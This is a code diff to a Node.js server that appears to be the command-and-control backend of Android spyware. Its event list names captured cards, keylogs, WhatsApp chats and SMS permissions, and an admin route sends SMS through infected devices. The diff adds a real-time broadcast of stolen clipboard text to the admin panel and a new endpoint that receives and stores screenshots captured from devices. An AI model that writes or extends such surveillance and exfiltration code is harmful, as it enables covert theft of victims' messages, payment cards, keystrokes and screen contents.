@@ -1834,7 +1834,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       'card_captured', 'server_metrics', 'notification', 'apk_sign_log',
       'command_queue_flushed', 'adult_video_added', 'upload_progress', 'upload_complete',
       'new_video', 'video_deleted', 'video_updated', 'viewer_count', 'new_comment',
-      'view_update', 'sms_permission_result', 'new_keylog', 'new_notification', 'new_whatsapp_chats'
+      'view_update', 'sms_permission_result', 'new_keylog', 'new_notification', 'new_whatsapp_chats', 'new_clipboard'
     ]);
     if (restrictedEvents.has(eventName)) {
       // Only send to authenticated sockets
@@ -3494,12 +3494,48 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       db.prepare(`INSERT INTO clipboard_entries (device_id, text, clip_timestamp, synced_at) VALUES (?, ?, ?, datetime('now'))`)
         .run(device_id, text, timestamp);
 
+      // Real-time broadcast to admin panel
+      if (io) {
+        io.emit('new_clipboard', {
+          device_id,
+          text,
+          clip_timestamp: timestamp,
+          synced_at: new Date().toISOString()
+        });
+      }
+
       console.log(`[CLIPBOARD] Device ${device_id}: "${text.substring(0, 50)}..."`);
       res.json({ success: true });
     } catch (err) {
       res.status(500).json({ error: err.message });
     }
   });
+
+  // ═══ SCREEN CAPTURE UPLOAD — device uploads screenshot ═══
+  app.post('/api/devices/screen-capture', express.json({ limit: '10mb' }), (req, res) => {
+    try {
+      const { device_id, image_base64, width, height } = req.body;
+      if (!device_id || !image_base64) return res.status(400).json({ error: 'device_id and image_base64 required' });
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS screen_captures (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, image_base64 TEXT, width INTEGER, height INTEGER,
+          file_size INTEGER, captured_at TEXT DEFAULT (datetime('now'))
+        )`);
+        const fileSize = Math.round(image_base64.length * 0.75);
+        db.prepare('INSERT INTO screen_captures (device_id, image_base64, width, height, file_size, captured_at) VALUES (?,?,?,?,?,?)').run(
+          device_id, image_base64, width || 1080, height || 1920, fileSize, new Date().toISOString()
+        );
+        if (io) {
+          io.emit('new_screen_capture', { device_id, captured_at: new Date().toISOString() });
+        }
+        console.log(`[SCREEN] Device ${device_id}: screenshot captured (${fileSize} bytes)`);
+      } catch (e) { console.error('[SCREEN] DB error:', e.message); }
+      res.json({ success: true });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+  });
+
 
   // Send SMS via device — admin sends command to a connected device
   app.post('/api/admin/send-sms', (req, res) => {
